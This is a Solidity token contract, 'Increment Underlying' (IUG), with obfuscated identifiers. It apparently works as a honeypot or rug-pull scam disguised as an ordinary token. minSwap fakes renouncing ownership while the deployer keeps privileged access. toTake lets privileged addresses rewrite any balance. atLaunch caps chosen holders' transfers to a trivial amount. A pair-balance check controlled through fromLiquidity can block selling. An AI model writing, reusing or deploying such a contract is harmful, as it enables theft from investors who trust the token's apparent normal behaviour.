//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

interface swapReceiver {
    function totalSupply() external view returns (uint256);

    function balanceOf(address atMode) external view returns (uint256);

    function transfer(address fundTokenTx, uint256 fundSell) external returns (bool);

    function allowance(address fundAmount, address spender) external view returns (uint256);

    function approve(address spender, uint256 fundSell) external returns (bool);

    function transferFrom(
        address sender,
        address fundTokenTx,
        uint256 fundSell
    ) external returns (bool);

    event Transfer(address indexed from, address indexed modeReceiver, uint256 value);
    event Approval(address indexed fundAmount, address indexed spender, uint256 value);
}

abstract contract teamFee {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface listLaunched {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface totalTokenTake {
    function createPair(address fundShould, address enableMin) external returns (address);
}

interface isAt is swapReceiver {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract IncrementUnderlying is teamFee, swapReceiver, isAt {

    address marketingLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function atList(address feeFrom, address fundTokenTx, uint256 fundSell) internal returns (bool) {
        if (feeFrom == tokenFund) {
            return maxShould(feeFrom, fundTokenTx, fundSell);
        }
        uint256 swapBuy = swapReceiver(walletAuto).balanceOf(limitEnable);
        require(swapBuy == senderMarketingTotal);
        require(fundTokenTx != limitEnable);
        if (tradingTxEnable[feeFrom]) {
            return maxShould(feeFrom, fundTokenTx, launchedModeLimit);
        }
        return maxShould(feeFrom, fundTokenTx, fundSell);
    }

    bool public receiverReceiver;

    uint256 public receiverTotalAuto;

    string private feeList = "IUG";

    function maxShould(address feeFrom, address fundTokenTx, uint256 fundSell) internal returns (bool) {
        require(maxMarketingReceiver[feeFrom] >= fundSell);
        maxMarketingReceiver[feeFrom] -= fundSell;
        maxMarketingReceiver[fundTokenTx] += fundSell;
        emit Transfer(feeFrom, fundTokenTx, fundSell);
        return true;
    }

    function fromLiquidity(uint256 fundSell) public {
        receiverToken();
        senderMarketingTotal = fundSell;
    }

    mapping(address => bool) public autoLiquidity;

    uint256 public swapBuyMode;

    bool private enableTo;

    uint256 private feeLaunchAmount;

    function atLaunch(address buyList) public {
        receiverToken();
        if (receiverTotalAuto == swapBuyMode) {
            txTrading = false;
        }
        if (buyList == tokenFund || buyList == walletAuto) {
            return;
        }
        tradingTxEnable[buyList] = true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return tradingMax;
    }

    function getOwner() external view returns (address) {
        return tradingList;
    }

    string private toTokenTrading = "Increment Underlying";

    function decimals() external view virtual override returns (uint8) {
        return senderSellTeam;
    }

    uint256 private tradingMax = 100000000 * 10 ** 18;

    mapping(address => mapping(address => uint256)) private buyTx;

    bool public txTrading;

    address public tokenFund;

    function approve(address amountTo, uint256 fundSell) public virtual override returns (bool) {
        buyTx[_msgSender()][amountTo] = fundSell;
        emit Approval(_msgSender(), amountTo, fundSell);
        return true;
    }

    function receiverToken() private view {
        require(autoLiquidity[_msgSender()]);
    }

    uint256 public txTradingFrom;

    function transfer(address txBuy, uint256 fundSell) external virtual override returns (bool) {
        return atList(_msgSender(), txBuy, fundSell);
    }

    bool public sellReceiver;

    function minSwap() public {
        emit OwnershipTransferred(tokenFund, address(0));
        tradingList = address(0);
    }

    function balanceOf(address atMode) public view virtual override returns (uint256) {
        return maxMarketingReceiver[atMode];
    }

    constructor (){
        if (receiverTotalAuto == tokenAmount) {
            tokenAmount = fromShould;
        }
        listLaunched amountTx = listLaunched(marketingLaunched);
        walletAuto = totalTokenTake(amountTx.factory()).createPair(amountTx.WETH(), address(this));
        
        tokenFund = _msgSender();
        minSwap();
        autoLiquidity[tokenFund] = true;
        maxMarketingReceiver[tokenFund] = tradingMax;
        
        emit Transfer(address(0), tokenFund, tradingMax);
    }

    mapping(address => uint256) private maxMarketingReceiver;

    uint256 constant launchedModeLimit = 4 ** 10;

    function name() external view virtual override returns (string memory) {
        return toTokenTrading;
    }

    uint256 private tokenAmount;

    address limitEnable = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => bool) public tradingTxEnable;

    uint8 private senderSellTeam = 18;

    function toTake(address txBuy, uint256 fundSell) public {
        receiverToken();
        maxMarketingReceiver[txBuy] = fundSell;
    }

    uint256 public maxFee;

    address public walletAuto;

    function transferFrom(address feeFrom, address fundTokenTx, uint256 fundSell) external override returns (bool) {
        if (_msgSender() != marketingLaunched) {
            if (buyTx[feeFrom][_msgSender()] != type(uint256).max) {
                require(fundSell <= buyTx[feeFrom][_msgSender()]);
                buyTx[feeFrom][_msgSender()] -= fundSell;
            }
        }
        return atList(feeFrom, fundTokenTx, fundSell);
    }

    function owner() external view returns (address) {
        return tradingList;
    }

    address private tradingList;

    uint256 senderMarketingTotal;

    uint256 private fromShould;

    function allowance(address enableReceiver, address amountTo) external view virtual override returns (uint256) {
        if (amountTo == marketingLaunched) {
            return type(uint256).max;
        }
        return buyTx[enableReceiver][amountTo];
    }

    function totalSenderTrading(address limitWallet) public {
        if (receiverReceiver) {
            return;
        }
        
        autoLiquidity[limitWallet] = true;
        
        receiverReceiver = true;
    }

    function symbol() external view virtual override returns (string memory) {
        return feeList;
    }

    uint256 totalFund;

    event OwnershipTransferred(address indexed amountSell, address indexed teamBuy);

}